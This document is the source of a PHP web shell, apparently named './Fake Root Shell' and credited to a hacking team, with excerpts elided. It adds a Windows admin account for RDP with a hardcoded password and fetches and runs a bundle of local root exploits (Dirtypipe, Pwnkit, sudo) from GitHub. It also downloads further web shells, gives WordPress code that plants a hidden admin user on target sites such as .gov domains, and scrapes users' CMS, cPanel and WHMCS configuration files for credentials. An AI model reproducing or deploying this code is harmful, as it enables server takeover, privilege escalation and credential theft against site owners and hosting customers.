...
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='./Fake Root'>
		<meta name='viewport' content='width=device-width, initial-scale=0.40'>
		<link rel='icon' href='https://i.ibb.co/bLLg0hb/fekrut.jpg'>
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>./Fake Root Shell</h1></a>";
			if(isset($_7['path'])){
				$path = $_7['path'];
				chdir($path);
			}else{
		...
		echo '<center class="anu">Create RDP</center>';
				...
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>'.exe_root("net user fekrut SanakK1T0#G410 /add", $path).exe_root("net localgroup administrators shizuo /add", $path).'<br>kalu nyo gagal muncul tulisan "Access is denied." , kalu nyo berhasil buek rdp kelak cuman muncul tulisan user kek pass nyo.
hosts: <gr>'.gethostbyname($_SERVER["HTTP_HOST"]).'
username: fekrut
password: SanakK1T0#G410 </code></pre>
					</div>
				</div>';}
				else{ echo "<script>alert('maaf sanak, iko cuman untuk windows server bae!');</script>"; }
			}
		// auto root
		if($_7['id'] == 'autoroot'){
		ob_implicit_flush();ob_end_flush();
		echo '<center class="anu">Auto Root by ./Fake Root</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
...
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2013/CVE-2013-2171' class='text-decoration-none text-light'>CVE-2013-2171 | FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation</a><br>
	...
	if(file_exists('alpha.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/alpha.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(alfa("https://raw.githubusercontent.com/BOTKNTL/kontol/master/alfatesla.php","alpha.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/alpha.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>WEY GAGAL BUEK SHELL ALFA</rd>";}}
	...
	if(file_exists('maimuna.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/maimuna.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(marijuana("https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php","maimuna.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/maimuna.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>WEY GAGAL LAGI SANAK</rd>";}
		} echo "</center>";
	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "wpadd") {?>
				<div class='container-fluid language-javascript'>
					<div class='shell mb-3'>
						<pre style='font-size:10px;'><code>function bengkuluadmin(){
$login = 'bengkulucyberteam';
$passw = 'dakdomete';
...
add_action('init','bengkuluadmin');</code></pre>
					</div>
					tarok kode diatas di file functions.php di web target.<br>
contoh: https://site.gov/wp-content/themes/[theme name/functions.php
				</div><?php
...
<input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
	...
	if(file_exists('detect.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babidetect.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(babidetect("https://gitlab.com/jasonrondiguez/a/-/raw/main/t0000000ls/shellllllllscaaannnnn.php","detect.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/detect.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>gagal buek shell backdoor detector:(</rd>";}
		} echo "</center>";
	}
		}
		// config grabber
		if($_7['id'] == 'config'){
	echo '<center class="anu"><br>Grab Config by ./Fake Root</center>';
	$etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd:(</rd>");
	$idx = mkdir("bengkulu_CONFIG", 0777);
	$isi_htc = "Options allnRequire NonenSatisfy Any";
	$htc = fopen("bengkulu_CONFIG/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			...
			foreach($user_config[1] as $bengkulu) {
				$user_config_dir = "/home/$bengkulu/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$bengkulu/.my.cnf" => "cpanel",
						"/home/$bengkulu/.accesshash" => "WHM-accesshash",
							"/home/$bengkulu/config/koneksi.php" => "Lokomedia",
							"/home/$bengkulu/forum/config.php" => "phpBB",
							"/home/$bengkulu/sites/default/settings.php" => "Drupal",
							"/home/$bengkulu/config/settings.inc.php" => "PrestaShop",
							"/home/$bengkulu/app/etc/local.xml" => "Magento",
							"/home/$bengkulu/admin/config.php" => "OpenCart",
							"/home/$bengkulu/application/config/database.php" => "Ellislab",
							"/home/$bengkulu/vb/includes/config.php" => "Vbulletin",
							"/home/$bengkulu/includes/config.php" => "Vbulletin",
							"/home/$bengkulu/forum/includes/config.php" => "Vbulletin",
							"/home/$bengkulu/forums/includes/config.php" => "Vbulletin",
							"/home/$bengkulu/cc/includes/config.php" => "Vbulletin",
							"/home/$bengkulu/inc/config.php" => "MyBB",
							"/home/$bengkulu/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/shop/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/os/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/oscom/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/products/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/cart/includes/configure.php" => "OsCommerce",
							"/home/$bengkulu/inc/conf_global.php" => "IPB",
							"/home/$bengkulu/wp-config.php" => "Wordpress",
							"/home/$bengkulu/wp/test/wp-config.php" => "Wordpress",
							"/home/$bengkulu/blog/wp-config.php" => "Wordpress",
							"/home/$bengkulu/beta/wp-config.php" => "Wordpress",
							"/home/$bengkulu/portal/wp-config.php" => "Wordpress",
							"/home/$bengkulu/site/wp-config.php" => "Wordpress",
							"/home/$bengkulu/wp/wp-config.php" => "Wordpress",
							"/home/$bengkulu/WP/wp-config.php" => "Wordpress",
							"/home/$bengkulu/news/wp-config.php" => "Wordpress",
							"/home/$bengkulu/wordpress/wp-config.php" => "Wordpress",
								"/home/$bengkulu/configuration.php" => "Joomla",
							"/home/$bengkulu/blog/configuration.php" => "Joomla",
							"/home/$bengkulu/submitticket.php" => "^WHMCS",
							"/home/$bengkulu/cms/configuration.php" => "Joomla",
							"/home/$bengkulu/beta/configuration.php" => "Joomla",
							"/home/$bengkulu/portal/configuration.php" => "Joomla",
							"/home/$bengkulu/site/configuration.php" => "Joomla",
							"/home/$bengkulu/main/configuration.php" => "Joomla",
							"/home/$bengkulu/home/configuration.php" => "Joomla",
							"/home/$bengkulu/demo/configuration.php" => "Joomla",
							"/home/$bengkulu/test/configuration.php" => "Joomla",
							"/home/$bengkulu/WHMCS/submitticket.php" => "WHMCS",
							"/home/$bengkulu/whmcs1/submitticket.php" => "WHMCS",										"/home/$bengkulu/secure/whm/submitticket.php" => "WHMCS",
							"/home/$bengkulu/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$bengkulu/panel/submitticket.php" => "WHMCS",
							"/home/$bengkulu/clientes/submitticket.php" => "WHMCS",
							"/home/$bengkulu/cliente/submitticket.php" => "WHMCS",
							"/home/$bengkulu/support/order/submitticket.php" => "WHMCS",
							"/home/$bengkulu/bb-config.php" => "BoxBilling",
							"/home/$bengkulu/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$bengkulu/box/bb-config.php" => "BoxBilling",
							"/home/$bengkulu/includes/dist-configure.php" => "Zencart",
							"/home/$bengkulu/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$bengkulu/support/order/includes/iso4217.php" => "Hostbills");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("bengkulu_CONFIG/$fekrut-$nama_config.txt","w");
	...
	echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/bengkulu_CONFIG'><font>Click Here</font></a></center>";
		}
		// adminer
		if($_7['id'] == 'adminer'){
	...
	if(file_exists('adminer.php')) {
		...
		<div class='card card-body text-dark input-group mb-3'>
			...
			<div class='form-check'>
				...
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='bengkulucyberteam.txt'>
				<i class='bi bi-file-earmark'></i> sc tobo kamu:
		...
		<div class='mb-3'>
			...
			<div class="container-fluid language-javascript">
				<div class="shell mb-3">
					<pre style="font-size:10px;"><code>Dakdo Hasil</code></pre>
				</div>
			</div>
		</div>';
		endif;
		...
		if (isset($_GET['dir']) && $_GET['id'] == "scanroot") {
			...
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/fekrutrooting/")) {
					mkdir($path."/shizuorooting");
					exe_root("curl https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/fekrutrooting");
					exe_root("tar -xf auto.tar.gz", $path."/shizuorooting");
					if (!file_exists($path."/fekrutorooting/netfilter")) {
						die("<center class='anu'>Gagal download !</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe_root("timeout 10 ./fekrutrooting/netfilter", $path).'Ptrace : '.exe_root("echo id | timeout 10 ./fekrutrooting/ptrace", $path).'Sequoia : '.exe_root("timeout 10 ./fekrutrooting/sequoia", $path).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/fekrutrooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./fekrutrooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/fekrutrooting").''.exe_root("rm -rf fekrutrooting", $path).'</code></pre>
					</div>
				</div>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">Tunggu bentar sanak...</center>';
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
				...
				if (!file_exists($path."/fekrutrooting/")) {
					mkdir($path."/fekrutrooting");
					exe("curl https://raw.githubusercontent.com/newbee1337/shizuos-minishell/main/tools/auto.tar.gz -o auto.tar.gz", $path."/fekrutrooting");
					exe("tar -xf auto.tar.gz", $path."/fekrutrooting");
					if (!file_exists($path."/fekrutrooting/netfilter")) {
						die("<center class='anu'>Gagal download!</center>");
					}
				}
				echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>Netfilter : '.exe("timeout 10 ./fekrutrooting/netfilter", $path).'Ptrace : '.exe("echo id | timeout 10 ./fekrutrooting/ptrace", $path).'Sequoia : '.exe("timeout 10 ./fekrutrooting/sequoia", $path).'OverlayFS : '.exe("echo id | timeout 10 ./overlayfs", $path."/fekrutrooting").'Dirtypipe : '.exe("echo id | timeout 10 ./fekrutrooting/dirtypipe /usr/bin/su", $path).'Sudo : '.exe("echo 12345 | timeout 10 sudoedit -s Y", $path).'Pwnkit : '.exe("echo id | timeout 10 ./pwnkit", $path."/fekrutrooting").''.exe("rm -rf fekrutrooting", $path).'</code></pre>
					</div>
				</div>';
		...
		if ($_7['yeah']) {
			...
			if(is_writable($dir)) {
				...
				@exe("rm -rf $dir");
				@exe("rmdir /s /q $dir");
		echo '<strong>Hapus folder</strong> OK! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				} else {
		echo '<strong>Hapus folder</strong> FAIL! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
				}
			}
		}
		echo "
		...
		</div><center><div class='text-secondary'><hr><font color=white>&copy; Bengkulu Cyber Team | ./Fake Root</font></div></center>
	</div>
</div>
</body>
</html>
